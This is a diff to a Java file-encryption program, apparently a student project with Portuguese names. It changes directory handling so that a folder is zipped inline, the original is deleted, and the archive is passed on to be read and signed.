@@ -92,20 +92,6 @@ public class FallIntoOblivion {
         ScheduledExecutorService executorEncrypt = Executors.newSingleThreadScheduledExecutor();
         ScheduledExecutorService executorDetect = Executors.newSingleThreadScheduledExecutor();
         
-        class zipDirThread implements Runnable {
-            String str;
-            zipDirThread(String s) { str = s; }
-            public void run() {
-                File directoryToZip = new File(str);
-                try {
-                    FolderZiper.zipFolder(str, str + ".zip");
-                } catch (Exception ex) {
-                    System.out.println(ex);
-                }
-                deleteDirectory(directoryToZip);
-            }
-        }
-        
         Runnable periodicTaskEncrypt = new Runnable() {
             public void run() {
                 // Clears the text on the line where the cursor is
@@ -152,9 +138,15 @@ public class FallIntoOblivion {
                         Assinatura fileSigning = new Assinatura();
                         
                         if (file.isDirectory()) {
-                            Thread t = new Thread(new zipDirThread(file.getAbsolutePath()));
-                            t.start();
+                            try {
+                                FolderZiper.zipFolder(file.getAbsolutePath(), file.getAbsolutePath() + ".zip");
+                            } catch (Exception ex) {
+                                System.out.println(ex);
+                            }
+                            deleteDirectory(file);
+                            file = new File(file.getAbsolutePath() + ".zip");
                         }
+                        
 
                         byte[] fBytes = Ler.umFicheiro(file.getAbsolutePath());
 
